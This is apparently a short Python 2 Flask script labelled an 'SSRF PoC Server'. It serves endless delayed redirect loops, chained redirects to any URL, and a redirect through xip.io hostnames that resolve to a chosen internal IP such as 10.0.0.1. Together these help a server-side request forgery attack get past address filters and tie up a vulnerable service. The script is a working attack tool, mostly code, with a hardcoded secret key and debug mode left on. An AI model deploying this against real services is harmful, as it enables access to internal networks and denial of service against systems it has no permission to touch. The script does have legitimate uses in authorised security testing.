# !/usr/bin/env python
#  -*- coding: utf-8 -*-

"""
<br>  SSRF PoC Server
<br>
<br>  requirement:
<br>  --(Python 2.x + pip)
<br>  --pip install flask
<br>
<br>  usage:
<br>  --python ssrf_server.py
<br>
<br>  functions:
<br>  --infinite loop with time-delay:
<br>  ----/loop/[any-char]?sleep=[seconds]
<br>  --redirect:
<br>  ----/redirect/[count]?url=[destination]
<br>  --domain to ip:
<br>  ----/dns?ip=[IP]
<br>
<br>  example:
<br>  --infinite redirect loop with a 10-second-delay each time
<br>  ----http://yourhost:666/loop/xxx?sleep=10
<br>  --redirect 3 times and go to google.com finally
<br>  ----http://yourhost:666/redirect/3?url=https://www.google.com)
<br>  --redirect to a DOMAIN,and let the domain lead to 10.0.0.1
<br>  ----http://yourhost:666/dns?ip=10.0.0.1
<br>
<br>  author[mail:i@cdxy.me]
"""

import time
import random
import sys
from flask import Flask, request, render_template_string, redirect, session
from string import ascii_lowercase

SLEEP_ARG = 'sleep'
URL_ARG = 'url'
IP_ARG = 'ip'
JUMP_COUNT = 'count'


class Config():
    SECRET_KEY = '1426b50619e48fc6c558b6da16545d2e'
    debug = True


app = Flask(__name__)
app.config.from_object(Config)


def random_string(length=8):
    return ''.join([random.choice(ascii_lowercase) for _ in range(length)])


@app.route('/')
def index():
    return render_template_string(__doc__)


@app.route('/loop/<string:random>')
def loop(random):
    s = request.args.get(SLEEP_ARG)
    if s:
        time.sleep(int(s))
        return redirect('/loop/%s?%s=%s' % (random_string(), SLEEP_ARG, s))
    return redirect('/loop/%s' % random_string())


@app.route('/redirect/<int:count>')
def redirect_(count):
    c = count
    url = request.args.get(URL_ARG)
    if c:
        session[JUMP_COUNT] = c
        return redirect('/redirect/' + str(c - 1) + '?' + URL_ARG + '=' + url)
    else:
        return redirect(url)


@app.route('/dns')
def dns2ip():
    return redirect('http://www.%s.xip.io' % request.args.get(IP_ARG))


if __name__ == '__main__':
    if '-h' in sys.argv or '--help' in sys.argv:
        print __doc__
        sys.exit(0)
    app.run(host='0.0.0.0', port=666)
